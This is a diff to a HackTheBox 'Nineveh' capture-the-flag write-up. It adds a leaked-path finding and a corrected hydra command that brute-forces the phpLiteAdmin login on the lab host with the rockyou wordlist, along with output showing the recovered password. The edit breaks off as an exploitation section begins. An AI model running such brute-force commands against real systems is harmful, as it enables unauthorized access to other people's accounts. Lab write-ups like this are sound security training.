@@ -92,6 +92,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 The db directory has a login page for phpLiteAdmin v1.9. The default password "admin" doesn't work.  
+The page also leaks a filepath via an SQL error at the top:  
+*Warning: rand() expects parameter 2 to be integer, float given in /var/www/ssl/db/index.php on line 114.*  
+  
 Looking at /secure_notes, we get another image, this time something that looks to be an old egyptian painting. I assume there is likely to be notes in here, and so dirbust in here as well looking for txt files.  
 While the dirbusting is runnig I download the image and inspect the metadata.
 ```bash
@@ -228,5 +231,18 @@ This indicate a possible LFI vuln but I can't find any way to read files aside f
 ### 4. Recover phpLiteAdmin login cred
 ```bash
 ─[us-dedivip-1]─[10.10.14.162]─[htb-jib1337@htb-3hrv0spjom]─[~/writeups/HackTheBox/HTB_Nineveh]
-└──╼ [★]$ hydra -l none -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64
+└──╼ [★]$ hydra -l '' -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 32
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-17 14:59:18
+[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344398 login tries (l:1/p:14344398), ~448263 tries per task
+[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
+[STATUS] 909.00 tries/min, 909 tries in 00:01h, 14343489 to do in 262:60h, 32 active
+[443][http-post-form] host: nineveh.htb   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-17 15:01:03
 ```
+The password for the admin panel is `password123`.
+
+### 5. Attempt exploitation of phpLiteAdmin panel
+
